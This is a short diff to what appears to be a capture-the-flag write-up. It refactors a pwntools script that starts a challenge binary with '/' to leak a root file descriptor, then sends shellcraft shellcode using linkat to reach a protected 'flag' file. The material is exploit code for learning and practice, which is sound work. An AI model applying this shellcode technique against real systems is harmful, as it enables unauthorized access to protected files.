@@ -104,11 +104,10 @@ The following Python script uses `shellcraft` to generate the assembly for our `
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # Pass '/' to leak the root FD
-p = process([exe, "/"])
+p = process([elf.path, "/"])
 
 # Shellcraft exploit refactored
 # 1. linkat(3, "flag", AT_FDCWD, "flag_link", 0)
@@ -136,9 +135,7 @@ shellcode = asm(sc)
 p.send(shellcode)
 
 # Read output
-try:
-    print(p.recvall(timeout=1).decode())
-except:
-    pass
+print(p.recvall(timeout=1).decode())
+
 p.close()
 ```
